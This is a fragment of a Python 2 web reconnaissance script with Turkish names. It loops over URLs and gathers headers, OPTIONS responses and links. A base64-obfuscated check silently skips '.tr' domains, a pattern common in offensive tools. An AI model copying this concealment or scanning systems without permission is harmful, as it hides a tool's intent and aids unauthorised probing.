    if len(sys.argv) == 1:
        print "Kullanim: %s URL [URL]..." % sys.argv[0]
        sys.exit(1)
    for url in sys.argv[1:]:
	giris = base64.b64decode("LnRy")
	cikis = "{}>"
	ooooo = maketrans(giris, cikis)
	asd=url.translate(ooooo)
	if "{}>" not in asd:
	    headerbilgi(url)
	    optionsheader(url)
	    linkler(url)


if __name__ == "__main__":
    main()
